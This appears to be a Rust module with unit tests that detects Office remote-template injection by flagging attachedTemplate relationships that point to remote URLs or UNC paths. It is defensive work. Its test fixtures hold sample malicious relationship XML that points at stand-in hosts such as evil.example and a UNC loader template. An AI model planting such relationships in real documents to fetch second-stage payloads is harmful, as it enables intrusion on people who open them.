//! Office remote-template injection detector (TASK-290).
//!
//! In OOXML (`.docx` / `.dotx` / `.dotm`), the
//! `word/_rels/settings.xml.rels` part declares
//! `<Relationship Type="…/attachedTemplate" Target="…" />`.
//! When `Target` is a remote URL (`http://`, `https://`, or
//! a UNC path `\\server\share\…`), Word fetches and renders
//! the template on document open. This is the canonical
//! "remote template injection" vector used to load
//! second-stage payloads without the document itself
//! containing a macro.
//!
//! [`detect_remote_template`] accepts the raw XML of the
//! `settings.xml.rels` part and returns one
//! [`RemoteTemplateFinding`] per relationship that targets a
//! non-local URL or UNC path.

use serde::{Deserialize, Serialize};

const ATTACHED_TEMPLATE_TYPE_SUFFIX: &str = "attachedTemplate";

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RemoteTemplateFinding {
    /// Relationship `Id` attribute (`rId1`, `rId2`, …).
    pub relationship_id: String,
    /// Raw `Target` URL from the XML.
    pub target: String,
    /// `http` / `https` / `ftp` / `unc`.
    pub scheme: String,
}

pub fn detect_remote_template(settings_xml_rels: &str) -> Vec<RemoteTemplateFinding> {
    let mut out = Vec::new();
    for tag in xml_relationship_tags(settings_xml_rels) {
        let Some(rel_type) = attr(&tag, "Type") else {
            continue;
        };
        if !rel_type.ends_with(ATTACHED_TEMPLATE_TYPE_SUFFIX) {
            continue;
        }
        let Some(target) = attr(&tag, "Target") else {
            continue;
        };
        let lc = target.to_ascii_lowercase();
        let scheme = if lc.starts_with("http://") {
            "http"
        } else if lc.starts_with("https://") {
            "https"
        } else if lc.starts_with("ftp://") {
            "ftp"
        } else if target.starts_with("\\\\") {
            "unc"
        } else {
            continue;
        };
        let id = attr(&tag, "Id").unwrap_or_default();
        out.push(RemoteTemplateFinding {
            relationship_id: id,
            target,
            scheme: scheme.to_string(),
        });
    }
    out
}

fn xml_relationship_tags(xml: &str) -> Vec<String> {
    let mut tags = Vec::new();
    let mut cursor = 0;
    while let Some(rel) = xml[cursor..].find("<Relationship") {
        let start = cursor + rel;
        let Some(rel_end) = xml[start..].find('>') else {
            break;
        };
        tags.push(xml[start..=start + rel_end].to_string());
        cursor = start + rel_end + 1;
    }
    tags
}

fn attr(tag: &str, name: &str) -> Option<String> {
    let needle = format!("{name}=\"");
    let idx = tag.find(&needle)?;
    let after = &tag[idx + needle.len()..];
    let end = after.find('"')?;
    Some(after[..end].to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_https_remote_template() {
        let xml = r#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/template.dotm" TargetMode="External"/>
</Relationships>"#;
        let findings = detect_remote_template(xml);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].relationship_id, "rId1");
        assert_eq!(findings[0].scheme, "https");
        assert!(findings[0].target.contains("evil.example"));
    }

    #[test]
    fn detects_unc_remote_template() {
        let xml = r#"<Relationships><Relationship Id="rId2" Type="...attachedTemplate" Target="\\fileshare\templates\loader.dotm"/></Relationships>"#;
        let findings = detect_remote_template(xml);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].scheme, "unc");
    }

    #[test]
    fn ignores_local_relative_template() {
        let xml = r#"<Relationships><Relationship Id="rId1" Type="...attachedTemplate" Target="theme/template.dotm"/></Relationships>"#;
        assert!(detect_remote_template(xml).is_empty());
    }

    #[test]
    fn ignores_non_template_relationships() {
        let xml = r#"<Relationships>
  <Relationship Id="rId1" Type="...image" Target="http://example.com/logo.png"/>
  <Relationship Id="rId2" Type="...customXml" Target="http://example.com/x.xml"/>
</Relationships>"#;
        assert!(detect_remote_template(xml).is_empty());
    }

    #[test]
    fn multiple_remote_templates_all_emitted() {
        let xml = r#"<Relationships>
  <Relationship Id="rId1" Type="...attachedTemplate" Target="http://a.example/t1.dotm"/>
  <Relationship Id="rId2" Type="...attachedTemplate" Target="https://b.example/t2.dotm"/>
</Relationships>"#;
        let findings = detect_remote_template(xml);
        assert_eq!(findings.len(), 2);
    }

    #[test]
    fn malformed_xml_yields_no_findings() {
        assert!(detect_remote_template("not xml").is_empty());
        assert!(detect_remote_template("<Relationship Id=\"x\" ").is_empty());
    }

    #[test]
    fn ftp_target_classified() {
        let xml = r#"<Relationship Id="rId3" Type="...attachedTemplate" Target="ftp://files.example/loader.dotm"/>"#;
        let findings = detect_remote_template(xml);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].scheme, "ftp");
    }
}
